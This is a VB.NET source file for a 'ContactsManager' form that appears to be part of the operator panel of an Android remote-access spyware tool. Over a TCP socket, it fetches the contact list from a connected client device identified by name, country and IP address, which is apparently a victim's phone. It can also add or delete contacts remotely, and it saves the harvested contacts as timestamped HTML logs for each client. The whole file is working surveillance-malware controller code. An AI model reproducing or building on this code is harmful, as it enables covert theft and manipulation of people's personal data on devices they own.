﻿Public Class ContactsManager
     Public Client As Net.Sockets.TcpClient
     Public classClient As sockets.Client
     Public Title As String = "null"
     Public tmpFolderUSER, tmpClientName, tmpCountry, tmpAddressIP As String
     Private BoxTitlePaintEventArgsWait As Boolean = False
     Private Sub SpyStyle()
        BoxTitle.BackColor = SpySettings.DefaultColor_Background
        For Each gr As DataGridView In Me.Controls.OfType(Of DataGridView)()
            gr.BackgroundColor = SpySettings.DefaultColor_Background
            gr.BackColor = SpySettings.DefaultColor_Background
            gr.ColumnHeadersDefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.SelectionForeColor = SpySettings.DefaultColor_Background
              gr.DefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
            gr.DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Foreground
            gr.ColumnHeadersDefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
        Next
     End Sub
     Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub ContactsManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Icon = New Icon(reso.res_Path & "\Icons\win\3.ico")
         SpyStyle()
         Me.ctxMenu.Renderer = New ThemeToolStrip
         DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f
         DGV0.DefaultCellStyle.Font = reso.f
         If SpySettings.SAVING_DATA = "No" Then
            SaveToolStripMenuItem.Visible = True
            SaveAsToolStripMenuItem.Visible = True
        End If
         Me.Text = Title
         Me.TOpacity.Interval = SpySettings.T_Interval
         Me.TOpacity.Enabled = True
         BoxTitlePaintEventArgsWait = True
     End Sub
     Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        reso.Directory_Exist(classClient)
        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {Me.DGV0, tmpFolderUSER, "Contacts Manager",
        tmpClientName, tmpCountry & " - " & tmpAddressIP, "Contacts", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
    End Sub
     Private Sub SaveAsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveAsToolStripMenuItem.Click
        Dim SaveAS As New SaveFileDialog
        SaveAS.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"
        SaveAS.Filter = "html (*.html)|*.html"
        If SaveAS.ShowDialog = Windows.Forms.DialogResult.OK Then
            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {Me.DGV0, "null", SaveAS.FileName,
            tmpClientName, tmpCountry & " - " & tmpAddressIP, "Contacts", "log", "null"})
        End If
        SaveAS.Dispose()
    End Sub
     Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
             For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                 Dim key As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Tag
                 Dim num As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                 If Not classClient Is Nothing Then
                     Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".contacts" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "del" & sockets.Data.SPL_DATA & key & sockets.Data.SPL_DATA & num, Codes.Encoding().GetBytes("null"), classClient}
                     classClient.SendAsync(objs)
                     DGV0.Rows.RemoveAt(DGV0.SelectedRows(i).Index)
                 End If
             Next
         End If
    End Sub
     Private Sub AddToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToolStripMenuItem.Click
         Dim pd As New AddNumber
         pd.Text = "Add new contact"
         pd.L0.Text = "Enter Name"
         pd.L1.Text = "Enter Number"
         pd.StartPosition = FormStartPosition.Manual
         pd.Location = Codes.FixSize(Me, pd)
         Select Case pd.ShowDialog(Me)
             Case DialogResult.OK
                 If Not classClient Is Nothing Then
                     Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".contacts" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "add" & sockets.Data.SPL_DATA & pd.InputText0.Text & sockets.Data.SPL_DATA & pd.InputText1.Text, Codes.Encoding().GetBytes("null"), classClient}
                     classClient.SendAsync(objs)
                 End If
         End Select
         pd.Close()
     End Sub
     Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        If Not classClient Is Nothing Then
             Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".contacts" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getContacts & sockets.Data.SPL_SOCKET & "contacts", Codes.Encoding().GetBytes("null"), classClient}
             classClient.SendAsync(objs)
         End If
    End Sub
     Private Sub BoxTitle_Paint(sender As Object, e As PaintEventArgs) Handles BoxTitle.Paint
         If BoxTitlePaintEventArgsWait Then
             Dim DGV0Count As Integer = DGV0.Rows.Count
             Dim _DGV0Count As String = "All " & CStr(DGV0Count)
             Dim _DGV0_SEL As String = "Selected " & CStr(DGV0.SelectedRows.Count)
             Dim clr As Color = SpySettings.DefaultColor_Foreground
             e.Graphics.DrawLine(New Pen(Color.FromArgb(50, clr.R, clr.G, clr.B)), 0, 1, BoxTitle.Width, 1)
             Dim ColorFont As Brush
             ColorFont = New SolidBrush(SpySettings.DefaultColor_Foreground)
             Dim ColorBack As Brush = New SolidBrush(Color.FromArgb(170, BoxTitle.BackColor.R, BoxTitle.BackColor.G, BoxTitle.BackColor.B))
             Dim TextRender0 As Size = TextRenderer.MeasureText(_DGV0Count & Space(10) & _DGV0_SEL, reso.f)
             Dim rect0 As New Rectangle(0, 2, BoxTitle.Width, TextRender0.Height + 5)
             e.Graphics.FillRectangle(New Pen(ColorBack).Brush, rect0)
             e.Graphics.DrawString(_DGV0Count & Space(10) & _DGV0_SEL & Space(10), reso.f, ColorFont, 0, 2)
             Dim MeSize As Size = TextRenderer.MeasureText("S", reso.f)
            If Not BoxTitle.Height = MeSize.Height + 3 Then
                BoxTitle.Height = MeSize.Height + 3
            End If
         End If
     End Sub
    Private Sub AngelAndroidForm_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        BoxTitle.Invalidate()
    End Sub
    Private Sub AngelAndroidForm_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        BoxTitle.Invalidate()
    End Sub
    Private Sub BoxTitle_Resize(sender As Object, e As EventArgs) Handles BoxTitle.Resize
        BoxTitle.Invalidate()
    End Sub
     Private Sub DGV0_RowsRemoved(sender As Object, e As DataGridViewRowsRemovedEventArgs) Handles DGV0.RowsRemoved
        BoxTitle.Invalidate()
    End Sub
     Private Sub DGV0_RowsAdded(sender As Object, e As DataGridViewRowsAddedEventArgs) Handles DGV0.RowsAdded
        BoxTitle.Invalidate()
    End Sub
    Private Sub DGV0_SelectionChanged(sender As Object, e As EventArgs) Handles DGV0.SelectionChanged
        BoxTitle.Invalidate()
    End Sub
 End Class